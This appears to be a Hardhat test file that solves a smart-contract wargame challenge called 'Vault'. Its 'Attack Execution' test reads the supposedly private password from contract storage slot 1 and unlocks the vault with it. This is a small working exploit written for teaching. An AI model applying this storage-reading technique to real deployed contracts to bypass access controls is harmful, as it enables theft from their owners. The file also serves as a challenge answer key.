const { ethers, network } = require("hardhat")
const { expect } = require("chai")
const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers")

describe("Challenge 8 - Vault", function () {
    async function initialStateFixture() {
        const [deployer, addr1] = await ethers.getSigners()
        const password = "MyAwesomePassw0rd!"
        const b32Password = ethers.utils.formatBytes32String(password)

        const Vault = await ethers.getContractFactory("Vault")
        const targetContract = await Vault.deploy(b32Password)
        await targetContract.deployed()

        const provider = new ethers.providers.Web3Provider(network.provider)

        return { deployer, addr1, targetContract, provider }
    }

    describe("Initial State", function () {
        it("Should deploy contract with correct deployer", async function () {
            const { deployer, targetContract } = await loadFixture(initialStateFixture)

            expect(targetContract.deployTransaction.from).to.equal(deployer.address)
        })

        it("Locked should be true", async function () {
            const { addr1, targetContract } = await loadFixture(initialStateFixture)

            const isLocked = await targetContract.connect(addr1).locked()
            expect(isLocked).to.be.true
        })
    })

    describe("Attack Execution", function () {
        it("Should read the password and unlock vault", async function () {
            const { addr1, targetContract, provider } = await loadFixture(initialStateFixture)

            //read the value of the storage memory slot 1
            const valueAtStorageSlot1 = await provider.getStorageAt(targetContract.address, 1)

            //try to unlock the vault
            const txnResponse = await targetContract.connect(addr1).unlock(valueAtStorageSlot1)
            await txnResponse.wait()

            const isLocked = await targetContract.connect(addr1).locked()
            expect(isLocked).to.be.false
        })
    })
})